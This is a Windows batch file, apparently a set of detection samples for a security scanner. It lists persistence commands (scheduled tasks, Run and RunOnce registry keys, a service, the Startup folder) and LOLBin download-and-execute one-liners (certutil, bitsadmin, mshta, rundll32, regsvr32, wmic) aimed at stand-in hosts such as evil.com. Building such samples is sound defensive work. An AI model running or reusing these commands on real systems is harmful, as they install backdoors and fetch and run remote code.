@echo off
REM Windows batch file with malicious patterns

REM ===== WINDOWS TASK SCHEDULER =====
schtasks /create /tn "UpdateService" /tr "powershell.exe -c curl http://evil.com | sh" /sc onlogon

REM ===== WINDOWS REGISTRY =====
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\malware.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Cleanup" /t REG_SZ /d "cmd.exe /c C:\backdoor.exe" /f

REM ===== WINDOWS SERVICE =====
sc create "SystemService" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto

REM ===== WINDOWS STARTUP FOLDER =====
copy "C:\malware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM ===== SCHEDULED TASK WITH SUSPICIOUS COMMAND =====
at 14:30 curl http://evil.com/payload.exe
at 12:00 wget http://malware.com/backdoor.exe

REM ===== CERTUTIL (LOLBIN) =====
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe

REM ===== BITSADMIN (LOLBIN) =====
bitsadmin /transfer "Update" http://malware.com/backdoor.exe C:\temp\backdoor.exe

REM ===== MSHTA (LOLBIN) =====
mshta.exe http://evil.com/payload.hta

REM ===== RUNDLL32 (LOLBIN) =====
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("wsh=new ActiveXObject('WScript.Shell');wsh.Run('cmd.exe /c curl http://evil.com | sh');");

REM ===== REGSVR32 (LOLBIN) =====
regsvr32 /s /i:http://evil.com/payload.sct scrobj.dll

REM ===== WMIC (LOLBIN) =====
wmic process call create "cmd.exe /c curl http://evil.com | powershell"

REM ===== FORFILES (LOLBIN) =====
forfiles /p c:\windows /m notepad.exe /c "cmd /c curl http://evil.com | sh"

